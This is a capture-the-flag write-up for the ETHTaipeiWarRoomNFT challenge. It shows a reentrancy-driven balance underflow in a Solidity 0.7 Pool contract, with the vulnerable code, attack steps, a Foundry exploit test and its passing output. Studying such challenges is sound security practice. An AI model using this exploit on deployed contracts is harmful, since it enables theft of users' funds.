# Challenge - ETHTaipeiWarRoomNFT

To set up this challenge, an NFT contract was deployed, and an NFT was minted for each player. Additionally, it deployed a Pool contract.

## Objective of CTF

To pass this level, we needed to accumulate a balance of over 1000 ether in the Pool contract:

## Vulnerability Analysis

### Root Cause: Overflow/Underflow

The contract specifies a compiler version of `^0.7.0`, which does not automatically prevent overflow or underflow in arithmetic operations.

In the `Pool` contract, there are two key functions: `deposit` and `withdraw`. These functions allow users to deposit NFTs into the pool and then withdraw them. The relevant code is as follows:

```solidity
function deposit(uint256 tokenId) external {
    IERC721(NFTCollateral).transferFrom(msg.sender, address(this), tokenId);
    _userDeposits[msg.sender][tokenId] = true;
    _balances[msg.sender] += 1 ether;
}

function withdraw(uint256 tokenId) external {
    require(_userDeposits[msg.sender][tokenId], "Should be owner.");
    require(_balances[msg.sender] > 0, "Should have balance.");

    IERC721(NFTCollateral).safeTransferFrom(address(this), msg.sender, tokenId);
    _balances[msg.sender] -= 1 ether;
    delete _userDeposits[msg.sender][tokenId];
}
```

The vulnerability arises because the `_balances` variable is updated directly using basic arithmetic operations without using the `SafeMath` library or any overflow/underflow checks.

### Attack steps:

1. Deposit an NFT into the pool.
2. Call the `withdraw` function, which triggers a callback function (e.g., `onERC721Received()`).
3. Inside the callback function, return the NFT to the pool and call the `withdraw` function again, allowing the attacker to withdraw more than the deposited balance, which causes an underflow in the `_balances` variable.

## PoC test case

```solidity
function testExploit() public {
    vm.startPrank(challenger);
    nft.approve(address(pool), tokenId);
    pool.deposit(tokenId);
    pool.withdraw(tokenId);
    vm.stopPrank();

    base.solve();
    assertTrue(base.isSolved());
}

function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
    if (cnt < 2) {
        cnt++;
        nft.safeTransferFrom(address(this), address(pool), tokenId);
        pool.withdraw(tokenId);
    }
    return this.onERC721Received.selector;
}
```

### Test Result

```
Ran 1 test for test/Pool.t.sol:PoolTest
[PASS] testExploit() (gas: 387192)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.86ms (642.17µs CPU time)

Ran 1 test suite in 244.16ms (1.86ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
